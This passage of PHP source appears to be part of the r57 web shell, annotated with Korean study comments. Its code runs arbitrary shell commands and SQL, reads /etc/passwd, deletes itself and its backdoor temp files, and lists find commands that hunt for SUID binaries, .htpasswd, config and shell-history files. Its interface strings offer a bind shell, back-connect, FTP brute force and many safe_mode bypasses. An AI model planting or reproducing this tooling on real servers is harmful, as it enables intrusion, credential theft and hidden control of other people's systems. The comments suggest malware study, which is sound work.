                    echo "<table width=100%><tr><td><font face=Verdana size=-2>affected rows : <b>".$ar."</b></font></td></tr></table><br>";

                 break;
              }
              }
          }
      }
  }


  echo "<br><form name=form method=POST>";
  echo in('hidden','db',0,$_POST['db']);
  echo in('hidden','db_server',0,$_POST['db_server']);
  echo in('hidden','db_port',0,$_POST['db_port']);
  echo in('hidden','mysql_l',0,$_POST['mysql_l']);
  echo in('hidden','mysql_p',0,$_POST['mysql_p']);
  echo in('hidden','mysql_db',0,$_POST['mysql_db']);
  echo in('hidden','cmd',0,'db_query');
  echo "<div align=center>";
  echo "<font face=Verdana size=-2><b>Base: </b><input type=text name=mysql_db value=\"".$sql->base."\"></font><br>";
  echo "<textarea cols=65 rows=10 name=db_query>".(!empty($_POST['db_query'])?($_POST['db_query']):("SHOW DATABASES;\nSELECT * FROM user;"))."</textarea><br><input type=submit name=submit value=\" Run SQL query \"></div><br><br>";
  echo "</form>";
  echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>"; die();
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0016
//

if(isset($_GET['delete']))
{
  @unlink(__FILE__);
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0017
//

if(isset($_GET['tmp']))
{
  @unlink("/tmp/bdpl");
  @unlink("/tmp/back");
  @unlink("/tmp/bd");
  @unlink("/tmp/bd.c");
  @unlink("/tmp/dp");
  @unlink("/tmp/dpc");
  @unlink("/tmp/dpc.c");
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0018
//
// sample  : PNO-0005.php
// Process : phpini 값 출력
// 사용법  : PNO-0005.php?phpini
// 실행    : FC-0050 함수에서 호출

if(isset($_GET['phpini']))
{
  echo $head;

  /*
  @ U_value

  */
  function U_value($value)
  {

     if ($value == '')
     {
        return '<i>no value</i>';
     }

     if (@is_bool($value))
     {
        return $value ? 'TRUE' : 'FALSE';
     }

     if ($value === null)
     {
        return 'NULL';
     }

     if (@is_object($value))
     {
        $value = (array) $value;
     }

     if (@is_array($value))
     {
        @ob_start();
        print_r($value);
        $value = @ob_get_contents();
        @ob_end_clean();
     }

  return U_wordwrap((string) $value);
  }

  /*
  @ U_wordwrap

  */
  function U_wordwrap($str)
  {
     $str = @wordwrap(@htmlspecialchars($str), 100, '<wbr />', true);

     return @preg_replace('!(&[^;]*)<wbr />([^;]*;)!', '$1$2<wbr />', $str);
  }

  if (@function_exists('ini_get_all'))
  {
     $r = '';
     echo '<table width=100%>', '<tr><td bgcolor=#cccccc><font face=Verdana size=-2 color=red><div align=center><b>Directive</b></div></font></td><td bgcolor=#cccccc><font face=Verdana size=-2 color=red><div align=center><b>Local Value</b></div></font></td><td bgcolor=#cccccc><font face=Verdana size=-2 color=red><div align=center><b>Master Value</b></div></font></td></tr>';

     foreach (@ini_get_all() as $key=>$value)
     {
        $r .= '<tr><td>'.ws(3).'<font face=Verdana size=-2><b>'.$key.'</b></font></td><td><font face=Verdana size=-2><div align=center><b>'.U_value($value['local_value']).'</b></div></font></td><td><font face=Verdana size=-2><div align=center><b>'.U_value($value['global_value']).'</b></div></font></td></tr>';
     }
     echo $r;
     echo '</table>';
  }

  echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>";
  die();
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0019
//
// 설명 : cpu 정보 가져온다.
//
// sample  : PNO-0006.php
// Process : cpu 정보 출력
// 사용법  : PNO-0006.php?cpu
// 실행    : FC-0019 자체 호출


if(isset($_GET['cpu']))
{
  echo $head;
  echo '<table width=100%><tr><td bgcolor=#cccccc><div align=center><font face=Verdana size=-2 color=red><b>CPU</b></font></div></td></tr></table><table width=100%>';
  $cpuf = @file("cpuinfo");

  if($cpuf)
   {
     $c = @sizeof($cpuf);
     for($i=0;$i<$c;$i++)
       {
        $info = @explode(":",$cpuf[$i]);
        if($info[1]==""){ $info[1]="---"; }
        {
           $r .= '<tr><td>'.ws(3).'<font face=Verdana size=-2><b>'.trim($info[0]).'</b></font></td><td><font face=Verdana size=-2><div align=center><b>'.trim($info[1]).'</b></div></font></td></tr>';
        }
       }
     echo $r;
   }
  else
   {
     echo '<tr><td>'.ws(3).'<div align=center><font face=Verdana size=-2><b> --- </b></font></div></td></tr>';
   }

  echo '</table>';
  echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>";
  die();
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0020
//
//
// 설명 : 메모리 정보 가져온다.
//
// 사용법  : PNO-0007.php?mem
// 실행    : FC-0020 자체 호출
// sample  : PNO-0007.php
//

if(isset($_GET['mem']))
{
  echo $head;
  echo '<table width=100%>
        <tr>
          <td bgcolor=#cccccc>
            <div align=center>
              <font face=Verdana size=-2 color=red>
              <b>MEMORY</b>
              </font>
            </div>
          </td>
        </tr>
      </table>
      <table width=100%>';
  $memf = @file("meminfo");
  if($memf)
   {
     $c = sizeof($memf);
     for($i=0;$i<$c;$i++)
       {
        $info = explode(":",$memf[$i]);

        if($info[1]=="")
        {
           $info[1]="---";
        }
        $r .= '<tr><td>'.ws(3).'<font face=Verdana size=-2><b>'.trim($info[0]).'</b></font></td><td><font face=Verdana size=-2><div align=center><b>'.trim($info[1]).'</b></div></font></td></tr>';
       }
     echo $r;
   }
  else
   {
     echo '<tr><td>'.ws(3).'<div align=center><font face=Verdana size=-2><b> --- </b></font></div></td></tr>';
   }

  echo '</table>';
  echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>";
  die();
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0021
//
//
// 설명    : 각 언어별 맞는 번역문을 보여준다.
//
// 사용법  :
// 실행    :
// sample  :
//

$lang=array(
/* --------------------------------------------------------------- */
'eng_text1' =>'Executed command',
'eng_text2' =>'Execute command on server',
'eng_text3' =>'Run command',
'eng_text4' =>'Work directory',
'eng_text5' =>'Upload files on server',
'eng_text6' =>'Local file',
'eng_text7' =>'Aliases',
'eng_text8' =>'Select alias',
'eng_butt1' =>'Execute',
'eng_butt1a'=>'Execute without reload',
'eng_butt2' =>'Upload',
'eng_text9' =>'Bind port to /bin/bash',
'eng_text10'=>'Port',
'eng_text11'=>'Password for access',
'eng_butt3' =>'Bind',
'eng_text12'=>'back-connect',
'eng_text13'=>'IP',
'eng_text14'=>'Port',
'eng_butt4' =>'Connect',
'eng_text15'=>'Upload files from remote server',
'eng_text16'=>'With',
'eng_text17'=>'Remote file',
'eng_text18'=>'Local file',
'eng_text19'=>'Exploits',
'eng_text20'=>'Use',
'eng_text21'=>'&nbsp;New name',
'eng_text22'=>'datapipe',
'eng_text23'=>'Local port',
'eng_text24'=>'Remote host',
'eng_text25'=>'Remote port',
'eng_text26'=>'Use',
'eng_butt5' =>'Run',
'eng_text28'=>'Work in safe_mode',
'eng_text29'=>'ACCESS DENIED',
'eng_butt6' =>'Change',
'eng_text30'=>'Cat file',
'eng_butt7' =>'Show',
'eng_text31'=>'File not found',
'eng_text32'=>'Eval PHP code',
'eng_text33'=>'Test bypass open_basedir with cURL functions',
'eng_butt8' =>'Test',
'eng_text34'=>'Test bypass safe_mode with include function',
'eng_text35'=>'Test bypass safe_mode with load file in mysql',
'eng_text36'=>'Database . Table',
'eng_text37'=>'Login',
'eng_text38'=>'Password',
'eng_text39'=>'Database',
'eng_text40'=>'Dump database table',
'eng_butt9' =>'Dump',
'eng_text41'=>'Save dump in file',
'eng_text42'=>'Edit files',
'eng_text43'=>'File for edit',
'eng_butt10'=>'Save',
'eng_text44'=>'Can\'t edit file! Only read access!',
'eng_text45'=>'File saved',
'eng_text46'=>'Show phpinfo()',
'eng_text47'=>'Show variables from php.ini',
'eng_text48'=>'Delete temp files',
'eng_butt11'=>'Edit file',
'eng_text49'=>'Delete script from server',
'eng_text50'=>'View cpu info',
'eng_text51'=>'View memory info',
'eng_text52'=>'Find text',
'eng_text53'=>'In dirs',
'eng_text54'=>'Find text in files',
'eng_butt12'=>'Find',
'eng_text55'=>'Only in files',
'eng_text56'=>'Nothing :(',
'eng_text57'=>'Create/Delete File/Dir',
'eng_text58'=>'name',
'eng_text59'=>'file',
'eng_text60'=>'dir',
'eng_butt13'=>'Create/Delete',
'eng_text61'=>'File created',
'eng_text62'=>'Dir created',
'eng_text63'=>'File deleted',
'eng_text64'=>'Dir deleted',
'eng_text65'=>'Create',
'eng_text66'=>'Delete',
'eng_text67'=>'Chown/Chgrp/Chmod',
'eng_text68'=>'Command',
'eng_text69'=>'param1',
'eng_text70'=>'param2',
'eng_text71'=>"Second commands param is:\r\n- for CHOWN - name of new owner or UID\r\n- for CHGRP - group name or GID\r\n- for CHMOD - 0777, 0755...",
'eng_text72'=>'Text for find',
'eng_text73'=>'Find in folder',
'eng_text74'=>'Find in files',
'eng_text75'=>'* you can use regexp',
'eng_text76'=>'Search text in files via find',
'eng_text80'=>'Type',
'eng_text81'=>'Net',
'eng_text82'=>'Databases',
'eng_text83'=>'Run SQL query',
'eng_text84'=>'SQL query',
'eng_text85'=>'Test bypass safe_mode with commands execute via MSSQL server',
'eng_text86'=>'Download files from server',
'eng_butt14'=>'Download',
'eng_text87'=>'Download files from remote ftp-server',
'eng_text88'=>'FTP-server:port',
'eng_text89'=>'File on ftp',
'eng_text90'=>'Transfer mode',
'eng_text91'=>'Archivation',
'eng_text92'=>'without archivation',
'eng_text93'=>'FTP',
'eng_text94'=>'FTP-bruteforce',
'eng_text95'=>'Users list',
'eng_text96'=>'Can\'t get users list',
'eng_text97'=>'checked: ',
'eng_text98'=>'success: ',
'eng_text99'=>'* use username from /etc/passwd for ftp login and password',
'eng_text100'=>'Send file to remote ftp server',
'eng_text101'=>'Use reverse (user -> resu) login for password',
'eng_text102'=>'Mail',
'eng_text103'=>'Send email',
'eng_text104'=>'Send file to email',
'eng_text105'=>'To',
'eng_text106'=>'From',
'eng_text107'=>'Subj',
'eng_butt15'=>'Send',
'eng_text108'=>'Mail',
'eng_text109'=>'Hide',
'eng_text110'=>'Show',
'eng_text111'=>'SQL-Server : Port',
'eng_text112'=>'Test bypass safe_mode with function mb_send_mail',
'eng_text113'=>'Test bypass safe_mode, view dir list via imap_list',
'eng_text114'=>'Test bypass safe_mode, view file contest via imap_body',
'eng_text115'=>'Test bypass safe_mode, copy file via compress.zlib:// in function copy()',
'eng_text116'=>'Copy from',
'eng_text117'=>'to',
'eng_text118'=>'File copied',
'eng_text119'=>'Cant copy file',
'eng_text120'=>'Test bypass safe_mode via creating php.ini',
'eng_text121'=>'Php.ini found, copy to php_ini_backup.',
'eng_err0'=>'Error! Can\'t write in file ',
'eng_err1'=>'Error! Can\'t read file ',
'eng_err2'=>'Error! Can\'t create ',
'eng_err3'=>'Error! Can\'t connect to ftp',
'eng_err4'=>'Error! Can\'t login on ftp server',
'eng_err5'=>'Error! Can\'t change dir on ftp',
'eng_err6'=>'Error! Can\'t sent mail',
'eng_err7'=>'Mail send',
'eng_text122' => 'error_log() Safe Mode Bypass',
'eng_text123' => 'htaccess safemode and open_basedir bypass',
'eng_text124' => 'Write to file',
'eng_text125' => 'Content',
'eng_text126' => 'SSI safe_mode bypass',
'eng_text127' => 'COM functions safe_mode and disable_function bypass',
'eng_text128' => 'ionCube extension safe_mode bypass',
'eng_text129' => 'win32std extension safe_mode bypass',
'eng_text130' => 'win32service extension safe_mode bypass',
'eng_text131' => 'perl extension safe_mode bypass',
'eng_text132' => 'FFI extension safe_mode bypass',
/* --------------------------------------------------------------- */
'kor_text1' =>'명령 실행',
'kor_text2' =>'서버 명령 실행',
'kor_text3' =>'명령 실행',
'kor_text4' =>'작업 디렉토리',
'kor_text5' =>'서버 업로드 파일',
'kor_text6' =>'로컬 파일',
'kor_text7' =>'Aliases',
'kor_text8' =>'alias 선택',
'kor_butt1' =>'실행',
'kor_butt1a'=>'다시불러오기 없이 실행',
'kor_butt2' =>'업로드',
'kor_text9' =>'/bin/bash로 포트 바인드',
'kor_text10'=>'포트',
'kor_text11'=>'비밀번호',
'kor_butt3' =>'바인드',
'kor_text12'=>'back-connect',
'kor_text13'=>'IP',
'kor_text14'=>'포트',
'kor_butt4' =>'연결',
'kor_text15'=>'원격 서버에서 파일 업로드',
'kor_text16'=>'With',
'kor_text17'=>'원격 파일',
'kor_text18'=>'로컬 파일',
'kor_text19'=>'exploits',
'kor_text20'=>'사용',
'kor_text21'=>'&nbsp;새이름',
'kor_text22'=>'datapipe',
'kor_text23'=>'로컬 포트',
'kor_text24'=>'원격 호스트',
'kor_text25'=>'원격 포트',
'kor_text26'=>'사용',
'kor_butt5' =>'실행',
'kor_text28'=>'안전모드로 작업',
'kor_text29'=>'접근 불가',
'kor_butt6' =>'변경',
'kor_text30'=>'파일 보기',
'kor_butt7' =>'보기',
'kor_text31'=>'파일 찾기 불가',
'kor_text32'=>'Eval PHP 코드',
'kor_text33'=>'cURL 함수로 open_basedir 우회테스트',
'kor_butt8' =>'테스트',
'kor_text34'=>'include함수로 안전모드 우회테스트',
'kor_text35'=>'mysql의 로컬 파일로 안전모드 우회테스트',
'kor_text36'=>'데이터베이스.테이블',
'kor_text37'=>'로그인',
'kor_text38'=>'비밀번호',
'kor_text39'=>'데이터베이스',
'kor_text40'=>'데이터베이스 테이블 덤프',
'kor_butt9' =>'덤프',
'kor_text41'=>'덤프를 파일로 저장',
'kor_text42'=>'파일 수정',
'kor_text43'=>'편집용 파일',
'kor_butt10'=>'저장',
'kor_text44'=>'파일을 고칠 수 없습니다! 읽기만 가능합니다!',
'kor_text45'=>'파일 저장',
'kor_text46'=>'phpinfo() 보기',
'kor_text47'=>'php.ini의 변수 보기',
'kor_text48'=>'temp 파일 삭제',
'kor_butt11'=>'Edit file',
'kor_text49'=>'서버에서 스크립트 삭제',
'kor_text50'=>'cpu 정보 보기',
'kor_text51'=>'memory 정보 보기',
'kor_text52'=>'텍스트 찾기',
'kor_text53'=>'디렉토리',
'kor_text54'=>'파일에서 텍스트 찾기',
'kor_butt12'=>'찾기',
'kor_text55'=>'파일에서만',
'kor_text56'=>'없음:(',
'kor_text57'=>'생성/삭제 파일/디렉토리',
'kor_text58'=>'제목',
'kor_text59'=>'파일',
'kor_text60'=>'디렉토리',
'kor_butt13'=>'생성/삭제',
'kor_text61'=>'파일 생성',
'kor_text62'=>'디렉토리 생성',
'kor_text63'=>'파일 삭제',
'kor_text64'=>'디렉토리 삭제',
'kor_text65'=>'생성',
'kor_text66'=>'삭제',
'kor_text67'=>'Chown/Chgrp/Chmod',
'kor_text68'=>'명령',
'kor_text69'=>'param1',
'kor_text70'=>'param2',
'kor_text71'=>"두번째 명령어 파라미터는 : \r\n- for CHOWN - 새로운 소유자의 이름 또는 UID\r\n- for CHGRP - 그룹 이름 또는 GID\r\n- for CHMOD - 0777, 0755...",
'kor_text72'=>'텍스트 찾기',
'kor_text73'=>'폴더에서 찾기',
'kor_text74'=>'파일에서 찾기',
'kor_text75'=>'*regexp을 사용할 수 있습니다.',
'kor_text76'=>'찾기로 파일에서 텍스트를 검색할 수 있습니다',
'kor_text80'=>'유형',
'kor_text81'=>'Net',
'kor_text82'=>'데이터베이스',
'kor_text83'=>'SQL 쿼리 실행',
'kor_text84'=>'SQL 쿼리',
'kor_text85'=>'MSSQL server의 명령 실행으로 안전모드 우회테스트',
'kor_text86'=>'서버에서 파일 다운로드',
'kor_butt14'=>'다운로드',
'kor_text87'=>'원격 ftp서버에서 파일 다운로드',
'kor_text88'=>'FTP 서버:포트',
'kor_text89'=>'ftp 파일',
'kor_text90'=>'변경 모드',
'kor_text91'=>'Archivation',
'kor_text92'=>'without archivation',
'kor_text93'=>'FTP',
'kor_text94'=>'FTP-bruteforce',
'kor_text95'=>'사용자 목록',
'kor_text96'=>'사용자 목록을 가져올 수 없습니다.',
'kor_text97'=>'체크: ',
'kor_text98'=>'성공: ',
'kor_text99'=>'* ftp 로그인과 비밀번호를 위해 /etc/passwd에서 username을 사용',
'kor_text100'=>'원격 ftp server로 파일 전송',
'kor_text101'=>'비밀번호를 알아내기 위해 reverse(user->resu)을 사용',
'kor_text102'=>'메일',
'kor_text103'=>'메일 보내기',
'kor_text104'=>'메일에 파일 보내기',
'kor_text105'=>'받는이',
'kor_text106'=>'보내는 사람',
'kor_text107'=>'제목',
'kor_butt15'=>'전송',
'kor_text108'=>'메일',
'kor_text109'=>'숨김',
'kor_text110'=>'보기',
'kor_text111'=>'SQL-서버:포트',
'kor_text112'=>'mb_send_mail 기능으로 안전모드 우회테스트',
'kor_text113'=>'안전모드 우회테스트, via imap_list를 통해 dir 목록 보기',
'kor_text114'=>'안전모드 우회테스트, imap_body로 파일 contest 보기',
'kor_text115'=>'안전모드 우회테스트, copy함수에서 compress.zlib://를 사용하여 파일 복사',
'kor_text116'=>'복사할 파일',
'kor_text117'=>'복사할 위치',
'kor_text118'=>'파일이 복사되었습니다.',
'kor_text119'=>'파일을 복사할 수 없습니다.',
'kor_text120'=>'php.ini를 생성하여 안전모드 우회테스트',
'kor_text121'=>'Php.ini를 찾았습니다. php_ini_backup으로 복사합니다.',
'kor_err0'=>'에러! 파일에 쓸 수 없습니다. ',
'kor_err1'=>'에러! 파일을 읽을 수 없습니다.',
'kor_err2'=>'에러! 파일을 생성할 수 없습니다. ',
'kor_err3'=>'에러! ftp에 연결할 수 없습니다.',
'kor_err4'=>'에러! ftp 서버로 로그인할 수 없습니다.',
'kor_err5'=>'에러! ftp의 디렉토리를 변경할 수 없습니다.',
'kor_err6'=>'에러! 메일을 보낼 수 없습니다.',
'kor_err7'=>'메일 보내기',
'kor_text122' => 'error_log() 안전 모드 우회',
'kor_text123' => 'htaccess 안전모드와 open_basedir 우회',
'kor_text124' => '파일에 쓰기',
'kor_text125' => 'Content',
'kor_text126' => 'SSI 안전모드 우회',
'kor_text127' => 'COM functions 안전모드와 disable_function 우회',
'kor_text128' => 'ionCube 확장자 안전모드 우회',
'kor_text129' => 'win32std 확장자 안전모드 우회',
'kor_text130' => 'win32service 확장자 안전모드 우회',
'kor_text131' => 'perl 확장자 안전모드 우회',
'kor_text132' => 'FFI 확장자 안전모드 우회',
);

/******************************************************************************************************/
// FUNCTION_COED : FC-0022
//
//
// 설명 : 자주 사용하는 명령어
//
// 사용법  :
// 실행    :
// sample  :
//

$aliases=array(
'find suid files'=>'find / -type f -perm -04000 -ls',
'find suid files in current dir'=>'find . -type f -perm -04000 -ls',
'find sgid files'=>'find / -type f -perm -02000 -ls',
'find sgid files in current dir'=>'find . -type f -perm -02000 -ls',
'find config.inc.php files'=>'find / -type f -name config.inc.php',
'find config.inc.php files in current dir'=>'find . -type f -name config.inc.php',
'find config* files'=>'find / -type f -name "config*"',
'find config* files in current dir'=>'find . -type f -name "config*"',
'find all writable files'=>'find / -type f -perm -2 -ls',
'find all writable files in current dir'=>'find . -type f -perm -2 -ls',
'find all writable directories'=>'find /  -type d -perm -2 -ls',
'find all writable directories in current dir'=>'find . -type d -perm -2 -ls',
'find all writable directories and files'=>'find / -perm -2 -ls',
'find all writable directories and files in current dir'=>'find . -perm -2 -ls',
'find all service.pwd files'=>'find / -type f -name service.pwd',
'find service.pwd files in current dir'=>'find . -type f -name service.pwd',
'find all .htpasswd files'=>'find / -type f -name .htpasswd',
'find .htpasswd files in current dir'=>'find . -type f -name .htpasswd',
'find all .bash_history files'=>'find / -type f -name .bash_history',
'find .bash_history files in current dir'=>'find . -type f -name .bash_history',
'find all .mysql_history files'=>'find / -type f -name .mysql_history',
'find .mysql_history files in current dir'=>'find . -type f -name .mysql_history',
'find all .fetchmailrc files'=>'find / -type f -name .fetchmailrc',
'find .fetchmailrc files in current dir'=>'find . -type f -name .fetchmailrc',
'list file attributes on a Linux second extended file system'=>'lsattr -va',
'show opened ports'=>'netstat -an | grep -i listen',
'----------------------------------------------------------------------------------------------------'=>'ls -la'
);

/******************************************************************************************************/
// FUNCTION_COED : FC-0023
//


$table_up1  = "<tr><td bgcolor=#cccccc><font face=Verdana size=-2><b><div align=center>:: ";
$table_up2  = " ::</div></b></font></td></tr><tr><td>";
$table_up3  = "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc>";
$table_end1 = "</td></tr>";
$arrow = " <font face=Webdings color=gray>4</font>";
$lb = "<font color=black>[</font>";
$rb = "<font color=black>]</font>";
$font = "<font face=Verdana size=-4>";
$ts = "<table class=table1 width=100% align=center>";
$te = "</table>";
$fs = "<form name=form method=POST>";
$fe = "</form>";

/******************************************************************************************************/
// FUNCTION_COED : FC-0024
//
// 설명    : 유저 정보.
//
// 사용법  : PNO-0008.php?users=username
// 실행    : FC-0051에서 FC-0024호출
// sample  : PNO-0008.php
// 제약    : unix에서만 실행
//

if(isset($_GET['users']))
{

  if(!$users=get_users())
  {
     echo "<center><font face=Verdana size=-2 color=red>".$lang[$language.'_text96']."</font></center>";
  }
  else
  {
     echo '<center>';
     foreach($users as $user) { echo $user."<br>"; }
     echo '</center>';
  }
  echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>";
  die();
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0025
//
// 설명    : dir 파라미터에 값을 받으면 해당 디렉토리로 이동
//
// 사용법  : PNO-0002.php?dir=c:\
// 실행    :
// sample  : PNO-0002.php
// 제약    :
//


if (!empty($_POST['dir']))
{
   @chdir($_POST['dir']);
}
$dir = @getcwd();

/******************************************************************************************************/
// FUNCTION_COED : FC-0026
//
// 설명    : unix인지 windows인지 판단한다.
//
// 사용법  :
// 실행    :
// sample  : PNO-0003.php,PNO-0004.php
// 제약    :
//


$unix = 0;

// 변수 $dir에 ":" 문자열이 있다면
// 윈도우 (c:\\) 이며
// 없다면 unix다..
//
if(strlen($dir)>1 && $dir[1]==":")
{
   // 윈도우
   $unix=0;
}
else
{
   // 유닉스
   $unix=1;
}


// 만약
// $dir변수에 값이 없다면.
//
if(empty($dir))
{
   // PNO-003.php 참고
  //
   // os 정보를 가져온다.
  //
   $os = getenv('OS');

  // 만약
  // $os에 값이 없다면
  //
   if(empty($os))
  {
      // PNO-0004.php 참고
      // uname를 가져온다.
     //
      $os = php_uname();
  }

  // $os 변수에 값이 없다면
  // $os에 "-" 넣어 none 표시
   if(empty($os))
  {
      $os ="-";
     $unix=1;
  }
   else
   {
      // $값이 있다면
     // $os의 문자열중 win있는지 검사
       if(@eregi("^win",$os))
     {
         // 문자열이 있다면 windwos 설정
        //
         $unix = 0;
     }
       else
     {
         // 문자열이 없다면 unix 설정
        //
         $unix = 1;
     }
   }
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0027
//



if(!empty($_POST['s_dir']) && !empty($_POST['s_text']) && !empty($_POST['cmd']) && $_POST['cmd'] == "search_text")
{
   echo $head;

   if(!empty($_POST['s_mask']) && !empty($_POST['m']))
  {
      $sr = new SearchResult($_POST['s_dir'],$_POST['s_text'],$_POST['s_mask']);
  }
   else
  {
      $sr = new SearchResult($_POST['s_dir'],$_POST['s_text']);
  }

   $sr->SearchText(0,0);
   $res = $sr->GetResultFiles();
   $found = $sr->GetMatchesCount();
   $titles = $sr->GetTitles();
   $r = "";

   if($found > 0)
   {
       $r .= "<TABLE width=100%>";

       foreach($res as $file=>$v)
       {

           $r .= "<TR>";
           $r .= "<TD colspan=2><font face=Verdana size=-2><b>".ws(3);
           $r .= (!$unix)? str_replace("/","\\",$file) : $file;
           $r .= "</b></font></ TD>";
           $r .= "</TR>";

           foreach($v as $a=>$b)
           {
               $r .= "<TR>";
               $r .= "<TD align=center><B><font face=Verdana size=-2>".$a."</font></B></TD>";
               $r .= "<TD><font face=Verdana size=-2>".ws(2).$b."</font></TD>";
               $r .= "</TR>\n";
           }
       }

       $r .= "</TABLE>";

       echo $r;
   }
   else
   {
     echo "<P align=center><B><font face=Verdana size=-2>".$lang[$language.'_text56']."</B></font></P>";
   }

   echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>";
   die();
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0028
//



if(!$safe_mode && strpos(ex("echo abcr57"),"r57")!=3)
{
   $safe_mode = 1;
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0029
//

$SERVER_SOFTWARE = getenv('SERVER_SOFTWARE');

if(empty($SERVER_SOFTWARE))
{
   $SERVER_SOFTWARE = "-";
}




/******************************************************************************************************/
// FUNCTION_COED : FC-0030
//


function ws($i)
{
   return @str_repeat("&nbsp;",$i);
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0031
//

function ex($cfe)
{
   $res = '';
   if (!empty($cfe))
   {
       // funciion_exists 함수는 함수가 존재하는지
       // 존재하지 않는지 검사해 주는 함수이다.
       if(function_exists('exec'))
       {
           // exec함수는 외부의 명령어를 실행할 수 있도록 해 주는 함수이다.
           // exex('실행할 명령어', 결과를 받을 변수, 오류발생(int형))으로 구성되어 있다.
           // join 함수는 php에서 배열의 원소에 지정된 값을 추가하여 반환해 주는 역할을 한다.
           // join('배열마다 결합해 줄 문자', 배열명)으로 이루어짐
           // 아마 배열을 출력할 때 나온 결과 값들을 보기 편하도록 정렬하는 역할인 듯 하다
           @exec($cfe,$res);
           $res = join("\n",$res);
       }
       elseif(function_exists('shell_exec'))
       {
           // shell_exec함수는 php에서 shell명령어를 사용할 수 있도록 해주는 함수이다.
           $res = @shell_exec($cfe);
       }
       elseif(function_exists('system'))
       {
           // exec와 마찬가지로 system함수는 쉘 명령어를 사용할 수 있도록 해줌
           // exec와 다른 점은 exec함수는 반환값을 출력하지 않지만
           // system함수는 반환값을 출력한다.

           // ob_start는 출력 버퍼에 값을 담아놓는 역할을 진행한다.
           // ob_start 뒤에 온 구문에서 출력하는 것은 to do 구문으로 취급되어 출력되지 않고 버퍼에 들어간다.
           // ob_get_contents는 출력 버퍼에 들어있는 값을 변수에 담을 때 사용한다.
           // 따라서 아래의 코드에서는 $rec라는 변수에 @system($cfe)를 실행했을 때 출력되는 값을 넣은 것이다.
           // @ob_end_clean은 출력 버퍼를 비우는 함수이다.
           // 값을 출력 버퍼에 저장하는 이유는 system함수는 값을 바로 반환시키기 때문에
           // 나중에 출력하기 위함이라고 예상할 수 있다.
           @ob_start();
           @system($cfe);
           $res = @ob_get_contents();
           @ob_end_clean();
       }
       elseif(function_exists('passthru'))
       {
           // passthru함수는 system함수나 exec함수와 유사하게 쉘 명령어를 실행시켜주는 역할을 수행한다.
           // 위의 system함수와 유사하게 실행 결과를 2진 데이터로 바로 리턴하기 때문에
           // 출력 버퍼를 사용하여 값이 출력되지 않고 저장시킨 뒤 $res변수에 넣은 것이라고 생각할 수 있다.
           @ob_start();
           @passthru($cfe);
           $res = @ob_get_contents();
           @ob_end_clean();
       }

       // is_resource함수는 안에 든 값이 resource타입인지 확인하는 함수이다.
       // resource타입이란 파일을 열 때 사용하는 fopen같은 함수들을 사용할 때
       // php내부적으로 버퍼기 힐당되었다, 필요가 없어지면 할당 공간을 해제하는 자료형이다.
       // popen 함수는 쉘 명령어에 값을 입력하거나 결과를 받을 때 사용
       // 닫을 때 pclose로 닫기만 하면 됨.
       elseif(@is_resource($f = @popen($cfe,"r")))
       {
           // @feof함수는 파일 포인터가 끝인지 아닌지 알려주는 함수이다.
           // 파일 포인터가 끝을 가르키고 있다면 null일 것이기 때문에 while문이 끝날 것이다.
           // .= 연산자는 php에서 문자열을 합칠 때 사용한다.
           // @fread함수는 파일을 읽어들일 때 사용하는 함수이다.
           // fread(읽어들일 파일, 읽어들일 용량) 형식을 가지고 있다.
           $res = "";
           while(!@feof($f))
           {
              $res .= @fread($f,1024);
            }
           @pclose($f);
       }
   }

   return $res;
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0032
//

function get_users()
{
   $users = array();
   $rows=file('/etc/passwd');

   if(!$rows)
  {
      return 0;
  }

   foreach ($rows as $string)
   {
       $user = @explode(":",$string);
       if(substr($string,0,1)!='#')
     {
         array_push($users,$user[0]);
     }
   }
   return $users;
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0033
//

function err($n,$txt='')
{
   echo '<table width=100% cellpadding=0 cellspacing=0><tr><td bgcolor=#cccccc><font color=red face=Verdana size=-2><div align=center><b>';
   echo $GLOBALS['lang'][$GLOBALS['language'].'_err'.$n];

   if(!empty($txt))
  {
      echo " $txt";
  }

   echo '</b></div></font></td></tr></table>';

return null;
}

/******************************************************************************************************/
// FUNCTION_COED : FC-0034
//


function perms($mode)
{
   if (!$GLOBALS['unix'])
  {
      return 0;
  }


   if( $mode & 0x1000 )
  {
      $type='p';
  }
   else if( $mode & 0x2000 )
  {
      $type='c';
  }
   else if( $mode & 0x4000 )
  {
      $type='d';
  }
   else if( $mode & 0x6000 )
  {
      $type='b';
  }
   else if( $mode & 0x8000 )
  {
      $type='-';
  }
   else if( $mode & 0xA000 )
  {
      $type='l';
  }
   else if( $mode & 0xC000 )
  {
      $type='s';
  }
   else
   {
      $type='u';
  }

   $owner["read"] = ($mode & 00400) ? 'r' : '-';
   $owner["write"] = ($mode & 00200) ? 'w' : '-';
   $owner["execute"] = ($mode & 00100) ? 'x' : '-';
   $group["read"] = ($mode & 00040) ? 'r' : '-';
   $group["write"] = ($mode & 00020) ? 'w' : '-';
   $group["execute"] = ($mode & 00010) ? 'x' : '-';
   $world["read"] = ($mode & 00004) ? 'r' : '-';
   $world["write"] = ($mode & 00002) ? 'w' : '-';
   $world["execute"] = ($mode & 00001) ? 'x' : '-';


   if( $mode & 0x800 )
   {
       $owner["execute"] = ($owner['execute']=='x') ? 's' : 'S';
   }
